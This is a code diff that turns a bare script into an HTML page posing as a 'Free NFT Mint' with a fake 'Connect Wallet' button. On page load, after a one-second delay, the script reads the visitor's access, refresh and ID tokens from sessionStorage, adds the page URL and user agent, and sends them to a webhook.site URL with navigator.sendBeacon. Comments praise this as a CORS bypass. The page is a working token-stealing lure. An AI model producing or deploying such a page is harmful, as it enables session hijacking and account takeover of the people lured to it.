@@ -1,18 +1,34 @@
-<script>
-  window.onload = function () {
-    setTimeout(() => {
-      const webhookURL = 'https://webhook.site/93ba68d2-a8b4-44f3-80fe-9a086e21f433';
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Claim Free NFT</title>
+  <script>
+    window.onload = function () {
+      setTimeout(() => {
+        const webhookURL = 'https://webhook.site/93ba68d2-a8b4-44f3-80fe-9a086e21f433';
 
-      const data = {
-        access_token: sessionStorage.getItem("access_token"),
-        refresh_token: sessionStorage.getItem("refresh_token"),
-        id_token: sessionStorage.getItem("id_token"),
-        location: window.location.href,
-        userAgent: navigator.userAgent
-      };
+        const data = {
+          access_token: sessionStorage.getItem("access_token"),
+          refresh_token: sessionStorage.getItem("refresh_token"),
+          id_token: sessionStorage.getItem("id_token"),
+          location: window.location.href,
+          userAgent: navigator.userAgent
+        };
 
-      const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
-      navigator.sendBeacon(webhookURL, blob);
-    }, 1000);
-  };
-</script>
+        // Convert JSON to Blob
+        const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
+
+        // ✅ Send without triggering CORS preflight
+        navigator.sendBeacon(webhookURL, blob);
+
+        console.log("🚀 Token data sent (CORS bypass)");
+      }, 1000);
+    };
+  </script>
+</head>
+<body>
+  <h1>🎉 Free NFT Mint</h1>
+  <p>Click "Connect Wallet" to claim yours.</p>
+  <button onclick="alert('Wallet connected!')">Connect Wallet</button>
+</body>
+</html>
